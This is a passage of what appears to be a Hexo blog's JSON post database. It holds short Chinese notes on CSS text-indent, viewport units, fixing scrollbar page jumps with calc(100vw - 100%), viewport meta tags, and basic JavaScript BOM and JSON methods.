CSS/em布局","published":1,"updated":"2018-09-05T06:33:18.447Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxyo0089zodvv4b5pn9u","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"text-indent","date":"2018-05-30T06:28:47.000Z","_content":"## CSS text-indent段落首行文字缩进\n1. css text-indent文本缩进样式属性单词，`text-indent`的值跟 `数字` + `单位` 组成缩进样式。\n\n````\n    .divcss5{ text-indent:35px}\n````\n\n2. 通常 `text-indent` 缩进属性将对`段落首行开头`文本文字进行缩进显示。如果使用`html br换行标签`，第二个换行开始也不会出现缩进效果。如果使用了html `P段落标签`段落换行，将会出现每个p段落换行开头都将缩进，这里我们给大家通过案例演示给大家，希望通过DIVCSS5案例掌握CSS text-indent缩进样式。\n\n\n<img src=\"\" word_img=\"\" style=\"background-image: url(about:blank); background-attachment: initial; background-size: initial; background-origin: initial; background-clip: initial; background-position: 50% 50%; background-repeat: no-repeat;\" />","source":"_posts/FrontEnd/HTML CSS/text-indent.md","raw":"---\ntitle: text-indent\ndate: 2018-05-30 14:28:47\ntags: 首行缩进\ncategories: CSS\n---\n## CSS text-indent段落首行文字缩进\n1. css text-indent文本缩进样式属性单词，`text-indent`的值跟 `数字` + `单位` 组成缩进样式。\n\n````\n    .divcss5{ text-indent:35px}\n````\n\n2. 通常 `text-indent` 缩进属性将对`段落首行开头`文本文字进行缩进显示。如果使用`html br换行标签`，第二个换行开始也不会出现缩进效果。如果使用了html `P段落标签`段落换行，将会出现每个p段落换行开头都将缩进，这里我们给大家通过案例演示给大家，希望通过DIVCSS5案例掌握CSS text-indent缩进样式。\n\n\n<img src=\"\" word_img=\"\" style=\"background-image: url(about:blank); background-attachment: initial; background-size: initial; background-origin: initial; background-clip: initial; background-position: 50% 50%; background-repeat: no-repeat;\" />","slug":"FrontEnd/HTML CSS/text-indent","published":1,"updated":"2018-09-05T06:33:18.447Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxys008czodvmlykium2","content":"<h2 id=\"CSS-text-indent段落首行文字缩进\"><a href=\"#CSS-text-indent段落首行文字缩进\" class=\"headerlink\" title=\"CSS text-indent段落首行文字缩进\"></a>CSS text-indent段落首行文字缩进</h2><ol>\n<li>css text-indent文本缩进样式属性单词，<code>text-indent</code>的值跟 <code>数字</code> + <code>单位</code> 组成缩进样式。</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.divcss5&#123; text-indent:35px&#125;</span><br></pre></td></tr></table></figure>\n<ol>\n<li>通常 <code>text-indent</code> 缩进属性将对<code>段落首行开头</code>文本文字进行缩进显示。如果使用<code>html br换行标签</code>，第二个换行开始也不会出现缩进效果。如果使用了html <code>P段落标签</code>段落换行，将会出现每个p段落换行开头都将缩进，这里我们给大家通过案例演示给大家，希望通过DIVCSS5案例掌握CSS text-indent缩进样式。</li>\n</ol>\n<p><img src=\"\" word_img=\"\" style=\"background-image: url(about:blank); background-attachment: initial; background-size: initial; background-origin: initial; background-clip: initial; background-position: 50% 50%; background-repeat: no-repeat;\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"CSS-text-indent段落首行文字缩进\"><a href=\"#CSS-text-indent段落首行文字缩进\" class=\"headerlink\" title=\"CSS text-indent段落首行文字缩进\"></a>CSS text-indent段落首行文字缩进</h2><ol>\n<li>css text-indent文本缩进样式属性单词，<code>text-indent</code>的值跟 <code>数字</code> + <code>单位</code> 组成缩进样式。</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.divcss5&#123; text-indent:35px&#125;</span><br></pre></td></tr></table></figure>\n<ol>\n<li>通常 <code>text-indent</code> 缩进属性将对<code>段落首行开头</code>文本文字进行缩进显示。如果使用<code>html br换行标签</code>，第二个换行开始也不会出现缩进效果。如果使用了html <code>P段落标签</code>段落换行，将会出现每个p段落换行开头都将缩进，这里我们给大家通过案例演示给大家，希望通过DIVCSS5案例掌握CSS text-indent缩进样式。</li>\n</ol>\n<p><img src=\"\" word_img=\"\" style=\"background-image: url(about:blank); background-attachment: initial; background-size: initial; background-origin: initial; background-clip: initial; background-position: 50% 50%; background-repeat: no-repeat;\"></p>\n"},{"title":"vw/vh/vm","date":"2018-06-22T01:07:31.000Z","_content":"## 视区相关单位`vw / vh / vm`简介以及可实际应用场景\n\n---\n[阅读原文](https://www.zhangxinxu.com/wordpress/2012/09/new-viewport-relative-units-vw-vh-vm-vmin/)","source":"_posts/FrontEnd/HTML CSS/vw-vh-vm.md","raw":"---\ntitle: vw/vh/vm\ndate: 2018-06-22 09:07:31\ntags: vw/vh/vm\ncategories: CSS\n---\n## 视区相关单位`vw / vh / vm`简介以及可实际应用场景\n\n---\n[阅读原文](https://www.zhangxinxu.com/wordpress/2012/09/new-viewport-relative-units-vw-vh-vm-vmin/)","slug":"FrontEnd/HTML CSS/vw-vh-vm","published":1,"updated":"2018-09-05T06:33:18.448Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxyt008fzodvglteuzza","content":"<h2 id=\"视区相关单位vw-vh-vm简介以及可实际应用场景\"><a href=\"#视区相关单位vw-vh-vm简介以及可实际应用场景\" class=\"headerlink\" title=\"视区相关单位vw / vh / vm简介以及可实际应用场景\"></a>视区相关单位<code>vw / vh / vm</code>简介以及可实际应用场景</h2><hr>\n<p><a href=\"https://www.zhangxinxu.com/wordpress/2012/09/new-viewport-relative-units-vw-vh-vm-vmin/\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"视区相关单位vw-vh-vm简介以及可实际应用场景\"><a href=\"#视区相关单位vw-vh-vm简介以及可实际应用场景\" class=\"headerlink\" title=\"视区相关单位vw / vh / vm简介以及可实际应用场景\"></a>视区相关单位<code>vw / vh / vm</code>简介以及可实际应用场景</h2><hr>\n<p><a href=\"https://www.zhangxinxu.com/wordpress/2012/09/new-viewport-relative-units-vw-vh-vm-vmin/\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"元素换行间隙-font-size","date":"2018-08-01T08:57:13.000Z","_content":"## 元素换行间距-font-size\n因为 `元素换行` 以及 继承 `font-size` 导致 元素之间产生间隙。\n\n解决办法：\n> font-size: 0;\n","source":"_posts/FrontEnd/HTML CSS/元素换行间距-font-size.md","raw":"---\ntitle: 元素换行间隙-font-size\ndate: 2018-08-01 16:57:13\ntags: font-size\ncategories: HTML\n---\n## 元素换行间距-font-size\n因为 `元素换行` 以及 继承 `font-size` 导致 元素之间产生间隙。\n\n解决办法：\n> font-size: 0;\n","slug":"FrontEnd/HTML CSS/元素换行间距-font-size","published":1,"updated":"2018-09-05T06:33:18.448Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxyw008hzodvpbh3b8x3","content":"<h2 id=\"元素换行间距-font-size\"><a href=\"#元素换行间距-font-size\" class=\"headerlink\" title=\"元素换行间距-font-size\"></a>元素换行间距-font-size</h2><p>因为 <code>元素换行</code> 以及 继承 <code>font-size</code> 导致 元素之间产生间隙。</p>\n<p>解决办法：</p>\n<blockquote>\n<p>font-size: 0;</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"元素换行间距-font-size\"><a href=\"#元素换行间距-font-size\" class=\"headerlink\" title=\"元素换行间距-font-size\"></a>元素换行间距-font-size</h2><p>因为 <code>元素换行</code> 以及 继承 <code>font-size</code> 导致 元素之间产生间隙。</p>\n<p>解决办法：</p>\n<blockquote>\n<p>font-size: 0;</p>\n</blockquote>\n"},{"title":"禁止滚动条出现页面跳动","date":"2018-06-22T08:48:01.000Z","_content":"## 水平居中布局与滚动条跳动的千年难题\n1.信息流页面，如新浪微博，是从上往下push渲染的。开始只有头部一些信息加载，此时页面高度有限，没有滚动条；然后，更多内容显示，滚动条出现，占据可用宽度，margin: 0 auto主体元素自然会做偏移——跳动产生。\n\n2.JS交互，本来默认页面高度不足一屏，结果点击了个“加载更多”，内容超过一屏，滚动条出现，页面主体就会左侧跳动。\n\n3.结构类似几个页面通过头部的水平导航刷新切换，结果有的页面有滚动条，有的没有。造成的结果就是，导航尼玛怎么跳来跳去！\n\n## CSS3计算`calc`和`vw`单位巧妙实现滚动条出现页面不跳动\n````\n.wrap-outer {\n    margin-left: calc(100vw - 100%);\n    // 或者\n    padding-left: calc(100vw - 100%);\n}\n````\n**首先**：`.wrap-outer`指的是居中定宽主体的父级，如果没有，创建一个（使用主体也是可以实现类似效果，不过本着宽度分离原则，不推荐）;\n\n**然后**: `calc`是CSS3中的计算，IE10+浏览器支持，IE9浏览器基本支持(不能用在background-position上);\n\n**最后**: `100vw`相对于浏览器的`window.innerWidth`，是`浏览器内部宽度`，注意，`滚动条宽度也计算在内`！ 而`100%是可用宽度`，是`不含滚动条宽度`。\n\n**于是**: `calc(100vw - 100%)`就是`浏览器滚动条宽度`(如果没有滚动条则是0)！左右都有一个滚动条宽度（或都是0）被占用，主体内容就可以永远居中浏览器啦，从而没有任何跳动！\n\n### **兼容性**\n支持：`IE9+` 以及其他现代浏览器。\n\n### **窄屏幕宽度下的处理**\n上面CSS还是有一点瑕疵的，浏览器宽度比较小的时候，左侧留的白明显与右边多，说不定会显得有点傻。此时，可能需要做点响应式处理会更好一点：\n\n````\n@media screen and (min-width: 1150px) {\n   .wrap-outer {\n       margin-left: calc(100vw - 100%);\n   }\n}\n````\n\n## 更新于2016年9月28日\n经过一些列项目实践，关于浏览器出现滚动条和消失页面不滚动有了`更加终极的解决方案`，经过大型项目实践已经验证相当具有可行性，这里特意分享下：\n````\nhtml {\n  overflow-y: scroll;\n}\n\n:root {\n  overflow-y: auto;\n  overflow-x: hidden;\n}\n\n:root body {\n  position: absolute;\n}\n\nbody {\n  width: 100vw;\n  overflow: hidden;\n}\n````\n\n## 三、结束语\n本文参考自：[Fix ‘jumping scrollbar’ issue using only CSS](https://aykevl.nl/2014/09/fix-jumping-scrollbar)\n\n[阅读原文](https://www.zhangxinxu.com/wordpress/2015/01/css-page-scrollbar-toggle-center-no-jumping/)","source":"_posts/FrontEnd/HTML CSS/禁止滚动条出现页面跳动.md","raw":"---\ntitle: 禁止滚动条出现页面跳动\ndate: 2018-06-22 16:48:01\ntags: vw让overflow:auto\ncategories: HTML CSS\n---\n## 水平居中布局与滚动条跳动的千年难题\n1.信息流页面，如新浪微博，是从上往下push渲染的。开始只有头部一些信息加载，此时页面高度有限，没有滚动条；然后，更多内容显示，滚动条出现，占据可用宽度，margin: 0 auto主体元素自然会做偏移——跳动产生。\n\n2.JS交互，本来默认页面高度不足一屏，结果点击了个“加载更多”，内容超过一屏，滚动条出现，页面主体就会左侧跳动。\n\n3.结构类似几个页面通过头部的水平导航刷新切换，结果有的页面有滚动条，有的没有。造成的结果就是，导航尼玛怎么跳来跳去！\n\n## CSS3计算`calc`和`vw`单位巧妙实现滚动条出现页面不跳动\n````\n.wrap-outer {\n    margin-left: calc(100vw - 100%);\n    // 或者\n    padding-left: calc(100vw - 100%);\n}\n````\n**首先**：`.wrap-outer`指的是居中定宽主体的父级，如果没有，创建一个（使用主体也是可以实现类似效果，不过本着宽度分离原则，不推荐）;\n\n**然后**: `calc`是CSS3中的计算，IE10+浏览器支持，IE9浏览器基本支持(不能用在background-position上);\n\n**最后**: `100vw`相对于浏览器的`window.innerWidth`，是`浏览器内部宽度`，注意，`滚动条宽度也计算在内`！ 而`100%是可用宽度`，是`不含滚动条宽度`。\n\n**于是**: `calc(100vw - 100%)`就是`浏览器滚动条宽度`(如果没有滚动条则是0)！左右都有一个滚动条宽度（或都是0）被占用，主体内容就可以永远居中浏览器啦，从而没有任何跳动！\n\n### **兼容性**\n支持：`IE9+` 以及其他现代浏览器。\n\n### **窄屏幕宽度下的处理**\n上面CSS还是有一点瑕疵的，浏览器宽度比较小的时候，左侧留的白明显与右边多，说不定会显得有点傻。此时，可能需要做点响应式处理会更好一点：\n\n````\n@media screen and (min-width: 1150px) {\n   .wrap-outer {\n       margin-left: calc(100vw - 100%);\n   }\n}\n````\n\n## 更新于2016年9月28日\n经过一些列项目实践，关于浏览器出现滚动条和消失页面不滚动有了`更加终极的解决方案`，经过大型项目实践已经验证相当具有可行性，这里特意分享下：\n````\nhtml {\n  overflow-y: scroll;\n}\n\n:root {\n  overflow-y: auto;\n  overflow-x: hidden;\n}\n\n:root body {\n  position: absolute;\n}\n\nbody {\n  width: 100vw;\n  overflow: hidden;\n}\n````\n\n## 三、结束语\n本文参考自：[Fix ‘jumping scrollbar’ issue using only CSS](https://aykevl.nl/2014/09/fix-jumping-scrollbar)\n\n[阅读原文](https://www.zhangxinxu.com/wordpress/2015/01/css-page-scrollbar-toggle-center-no-jumping/)","slug":"FrontEnd/HTML CSS/禁止滚动条出现页面跳动","published":1,"updated":"2018-09-05T06:33:18.448Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxyy008lzodvtq9118rh","content":"<h2 id=\"水平居中布局与滚动条跳动的千年难题\"><a href=\"#水平居中布局与滚动条跳动的千年难题\" class=\"headerlink\" title=\"水平居中布局与滚动条跳动的千年难题\"></a>水平居中布局与滚动条跳动的千年难题</h2><p>1.信息流页面，如新浪微博，是从上往下push渲染的。开始只有头部一些信息加载，此时页面高度有限，没有滚动条；然后，更多内容显示，滚动条出现，占据可用宽度，margin: 0 auto主体元素自然会做偏移——跳动产生。</p>\n<p>2.JS交互，本来默认页面高度不足一屏，结果点击了个“加载更多”，内容超过一屏，滚动条出现，页面主体就会左侧跳动。</p>\n<p>3.结构类似几个页面通过头部的水平导航刷新切换，结果有的页面有滚动条，有的没有。造成的结果就是，导航尼玛怎么跳来跳去！</p>\n<h2 id=\"CSS3计算calc和vw单位巧妙实现滚动条出现页面不跳动\"><a href=\"#CSS3计算calc和vw单位巧妙实现滚动条出现页面不跳动\" class=\"headerlink\" title=\"CSS3计算calc和vw单位巧妙实现滚动条出现页面不跳动\"></a>CSS3计算<code>calc</code>和<code>vw</code>单位巧妙实现滚动条出现页面不跳动</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.wrap-outer &#123;</span><br><span class=\"line\">    margin-left: calc(100vw - 100%);</span><br><span class=\"line\">    // 或者</span><br><span class=\"line\">    padding-left: calc(100vw - 100%);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>首先</strong>：<code>.wrap-outer</code>指的是居中定宽主体的父级，如果没有，创建一个（使用主体也是可以实现类似效果，不过本着宽度分离原则，不推荐）;</p>\n<p><strong>然后</strong>: <code>calc</code>是CSS3中的计算，IE10+浏览器支持，IE9浏览器基本支持(不能用在background-position上);</p>\n<p><strong>最后</strong>: <code>100vw</code>相对于浏览器的<code>window.innerWidth</code>，是<code>浏览器内部宽度</code>，注意，<code>滚动条宽度也计算在内</code>！ 而<code>100%是可用宽度</code>，是<code>不含滚动条宽度</code>。</p>\n<p><strong>于是</strong>: <code>calc(100vw - 100%)</code>就是<code>浏览器滚动条宽度</code>(如果没有滚动条则是0)！左右都有一个滚动条宽度（或都是0）被占用，主体内容就可以永远居中浏览器啦，从而没有任何跳动！</p>\n<h3 id=\"兼容性\"><a href=\"#兼容性\" class=\"headerlink\" title=\"兼容性\"></a><strong>兼容性</strong></h3><p>支持：<code>IE9+</code> 以及其他现代浏览器。</p>\n<h3 id=\"窄屏幕宽度下的处理\"><a href=\"#窄屏幕宽度下的处理\" class=\"headerlink\" title=\"窄屏幕宽度下的处理\"></a><strong>窄屏幕宽度下的处理</strong></h3><p>上面CSS还是有一点瑕疵的，浏览器宽度比较小的时候，左侧留的白明显与右边多，说不定会显得有点傻。此时，可能需要做点响应式处理会更好一点：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@media screen and (min-width: 1150px) &#123;</span><br><span class=\"line\">   .wrap-outer &#123;</span><br><span class=\"line\">       margin-left: calc(100vw - 100%);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"更新于2016年9月28日\"><a href=\"#更新于2016年9月28日\" class=\"headerlink\" title=\"更新于2016年9月28日\"></a>更新于2016年9月28日</h2><p>经过一些列项目实践，关于浏览器出现滚动条和消失页面不滚动有了<code>更加终极的解决方案</code>，经过大型项目实践已经验证相当具有可行性，这里特意分享下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">html &#123;</span><br><span class=\"line\">  overflow-y: scroll;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">:root &#123;</span><br><span class=\"line\">  overflow-y: auto;</span><br><span class=\"line\">  overflow-x: hidden;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">:root body &#123;</span><br><span class=\"line\">  position: absolute;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">body &#123;</span><br><span class=\"line\">  width: 100vw;</span><br><span class=\"line\">  overflow: hidden;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"三、结束语\"><a href=\"#三、结束语\" class=\"headerlink\" title=\"三、结束语\"></a>三、结束语</h2><p>本文参考自：<a href=\"https://aykevl.nl/2014/09/fix-jumping-scrollbar\" target=\"_blank\" rel=\"noopener\">Fix ‘jumping scrollbar’ issue using only CSS</a></p>\n<p><a href=\"https://www.zhangxinxu.com/wordpress/2015/01/css-page-scrollbar-toggle-center-no-jumping/\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"水平居中布局与滚动条跳动的千年难题\"><a href=\"#水平居中布局与滚动条跳动的千年难题\" class=\"headerlink\" title=\"水平居中布局与滚动条跳动的千年难题\"></a>水平居中布局与滚动条跳动的千年难题</h2><p>1.信息流页面，如新浪微博，是从上往下push渲染的。开始只有头部一些信息加载，此时页面高度有限，没有滚动条；然后，更多内容显示，滚动条出现，占据可用宽度，margin: 0 auto主体元素自然会做偏移——跳动产生。</p>\n<p>2.JS交互，本来默认页面高度不足一屏，结果点击了个“加载更多”，内容超过一屏，滚动条出现，页面主体就会左侧跳动。</p>\n<p>3.结构类似几个页面通过头部的水平导航刷新切换，结果有的页面有滚动条，有的没有。造成的结果就是，导航尼玛怎么跳来跳去！</p>\n<h2 id=\"CSS3计算calc和vw单位巧妙实现滚动条出现页面不跳动\"><a href=\"#CSS3计算calc和vw单位巧妙实现滚动条出现页面不跳动\" class=\"headerlink\" title=\"CSS3计算calc和vw单位巧妙实现滚动条出现页面不跳动\"></a>CSS3计算<code>calc</code>和<code>vw</code>单位巧妙实现滚动条出现页面不跳动</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.wrap-outer &#123;</span><br><span class=\"line\">    margin-left: calc(100vw - 100%);</span><br><span class=\"line\">    // 或者</span><br><span class=\"line\">    padding-left: calc(100vw - 100%);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>首先</strong>：<code>.wrap-outer</code>指的是居中定宽主体的父级，如果没有，创建一个（使用主体也是可以实现类似效果，不过本着宽度分离原则，不推荐）;</p>\n<p><strong>然后</strong>: <code>calc</code>是CSS3中的计算，IE10+浏览器支持，IE9浏览器基本支持(不能用在background-position上);</p>\n<p><strong>最后</strong>: <code>100vw</code>相对于浏览器的<code>window.innerWidth</code>，是<code>浏览器内部宽度</code>，注意，<code>滚动条宽度也计算在内</code>！ 而<code>100%是可用宽度</code>，是<code>不含滚动条宽度</code>。</p>\n<p><strong>于是</strong>: <code>calc(100vw - 100%)</code>就是<code>浏览器滚动条宽度</code>(如果没有滚动条则是0)！左右都有一个滚动条宽度（或都是0）被占用，主体内容就可以永远居中浏览器啦，从而没有任何跳动！</p>\n<h3 id=\"兼容性\"><a href=\"#兼容性\" class=\"headerlink\" title=\"兼容性\"></a><strong>兼容性</strong></h3><p>支持：<code>IE9+</code> 以及其他现代浏览器。</p>\n<h3 id=\"窄屏幕宽度下的处理\"><a href=\"#窄屏幕宽度下的处理\" class=\"headerlink\" title=\"窄屏幕宽度下的处理\"></a><strong>窄屏幕宽度下的处理</strong></h3><p>上面CSS还是有一点瑕疵的，浏览器宽度比较小的时候，左侧留的白明显与右边多，说不定会显得有点傻。此时，可能需要做点响应式处理会更好一点：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@media screen and (min-width: 1150px) &#123;</span><br><span class=\"line\">   .wrap-outer &#123;</span><br><span class=\"line\">       margin-left: calc(100vw - 100%);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"更新于2016年9月28日\"><a href=\"#更新于2016年9月28日\" class=\"headerlink\" title=\"更新于2016年9月28日\"></a>更新于2016年9月28日</h2><p>经过一些列项目实践，关于浏览器出现滚动条和消失页面不滚动有了<code>更加终极的解决方案</code>，经过大型项目实践已经验证相当具有可行性，这里特意分享下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">html &#123;</span><br><span class=\"line\">  overflow-y: scroll;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">:root &#123;</span><br><span class=\"line\">  overflow-y: auto;</span><br><span class=\"line\">  overflow-x: hidden;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">:root body &#123;</span><br><span class=\"line\">  position: absolute;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">body &#123;</span><br><span class=\"line\">  width: 100vw;</span><br><span class=\"line\">  overflow: hidden;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"三、结束语\"><a href=\"#三、结束语\" class=\"headerlink\" title=\"三、结束语\"></a>三、结束语</h2><p>本文参考自：<a href=\"https://aykevl.nl/2014/09/fix-jumping-scrollbar\" target=\"_blank\" rel=\"noopener\">Fix ‘jumping scrollbar’ issue using only CSS</a></p>\n<p><a href=\"https://www.zhangxinxu.com/wordpress/2015/01/css-page-scrollbar-toggle-center-no-jumping/\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"视口定宽布局","date":"2018-05-17T01:43:01.000Z","_content":"## 固定视口宽度，自动缩放\n\n````\n<meta name=\"viewport\" content=\"width=640, user-scalable=no, target-densitydpi=device-dpi\">\n````\n\n强制固定视口宽度为`content=\"width=640`,这样无论任何分辨率下，都缩放该比率的页面。\n\n","source":"_posts/FrontEnd/HTML CSS/视口定宽布局.md","raw":"---\ntitle: 视口定宽布局\ndate: 2018-05-17 09:43:01\ntags: viewport\ncategories: CSS\n---\n## 固定视口宽度，自动缩放\n\n````\n<meta name=\"viewport\" content=\"width=640, user-scalable=no, target-densitydpi=device-dpi\">\n````\n\n强制固定视口宽度为`content=\"width=640`,这样无论任何分辨率下，都缩放该比率的页面。\n\n","slug":"FrontEnd/HTML CSS/视口定宽布局","published":1,"updated":"2018-09-05T06:33:18.449Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxz1008ozodvzblqx2xw","content":"<h2 id=\"固定视口宽度，自动缩放\"><a href=\"#固定视口宽度，自动缩放\" class=\"headerlink\" title=\"固定视口宽度，自动缩放\"></a>固定视口宽度，自动缩放</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta name=&quot;viewport&quot; content=&quot;width=640, user-scalable=no, target-densitydpi=device-dpi&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>强制固定视口宽度为<code>content=&quot;width=640</code>,这样无论任何分辨率下，都缩放该比率的页面。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"固定视口宽度，自动缩放\"><a href=\"#固定视口宽度，自动缩放\" class=\"headerlink\" title=\"固定视口宽度，自动缩放\"></a>固定视口宽度，自动缩放</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta name=&quot;viewport&quot; content=&quot;width=640, user-scalable=no, target-densitydpi=device-dpi&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>强制固定视口宽度为<code>content=&quot;width=640</code>,这样无论任何分辨率下，都缩放该比率的页面。</p>\n"},{"title":"JS-BOM","date":"2018-05-14T07:48:51.000Z","_content":"document.documentElement.clientWidth // 设备宽度\n\nwindow.innerWidth  // 窗口宽度\n\ndocument.documentElement.style.fontSize // 根节点 fontSize: string\n\n let rootFZ = Number(document.documentElement.style.fontSize.split('px')[0]); // 根节点 fontSize: number\n\n### 事件监听\n`onTransitionEnd`","source":"_posts/FrontEnd/JS/JS-BOM.md","raw":"---\ntitle: JS-BOM\ndate: 2018-05-14 15:48:51\ntags: BOM\ncategories: JS\n---\ndocument.documentElement.clientWidth // 设备宽度\n\nwindow.innerWidth  // 窗口宽度\n\ndocument.documentElement.style.fontSize // 根节点 fontSize: string\n\n let rootFZ = Number(document.documentElement.style.fontSize.split('px')[0]); // 根节点 fontSize: number\n\n### 事件监听\n`onTransitionEnd`","slug":"FrontEnd/JS/JS-BOM","published":1,"updated":"2018-09-05T06:33:18.451Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxz2008rzodvzr6xfaaq","content":"<p>document.documentElement.clientWidth // 设备宽度</p>\n<p>window.innerWidth  // 窗口宽度</p>\n<p>document.documentElement.style.fontSize // 根节点 fontSize: string</p>\n<p> let rootFZ = Number(document.documentElement.style.fontSize.split(‘px’)[0]); // 根节点 fontSize: number</p>\n<h3 id=\"事件监听\"><a href=\"#事件监听\" class=\"headerlink\" title=\"事件监听\"></a>事件监听</h3><p><code>onTransitionEnd</code></p>\n","site":{"data":{}},"excerpt":"","more":"<p>document.documentElement.clientWidth // 设备宽度</p>\n<p>window.innerWidth  // 窗口宽度</p>\n<p>document.documentElement.style.fontSize // 根节点 fontSize: string</p>\n<p> let rootFZ = Number(document.documentElement.style.fontSize.split(‘px’)[0]); // 根节点 fontSize: number</p>\n<h3 id=\"事件监听\"><a href=\"#事件监听\" class=\"headerlink\" title=\"事件监听\"></a>事件监听</h3><p><code>onTransitionEnd</code></p>\n"},{"title":"JSON方法","date":"2018-07-04T01:56:44.000Z","_content":"## JSON的食用方法\n````\nJSON.stringify()  // 把一个对象转换成json字符串， \nJSON.parse()  // 把一个json字符串解析成对象。。\n````\n","source":"_posts/FrontEnd/JS/JSON方法.md","raw":"---\ntitle: JSON方法\ndate: 2018-07-04 09:56:44\ntags: JSON\ncategories: JSON\n---\n## JSON的食用方法\n````\nJSON.stringify()  // 把一个对象转换成json字符串， \nJSON.parse()  // 把一个json字符串解析成对象。。\n````\n","slug":"FrontEnd/JS/JSON方法","published":1,"updated":"2018-09-05T06:33:18.452Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxz4008uzodvydvgglp7","content":"<h2 id=\"JSON的食用方法\"><a href=\"#JSON的食用方法\" class=\"headerlink\" title=\"JSON的食用方法\"></a>JSON的食用方法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JSON.stringify()  // 把一个对象转换成json字符串， </span><br><span class=\"line\">JSON.parse()  // 把一个json字符串解析成对象。。</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"JSON的食用方法\"><a href=\"#JSON的食用方法\" class=\"headerlink\" title=\"JSON的食用方法\"></a>JSON的食用方法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JSON.stringify()  // 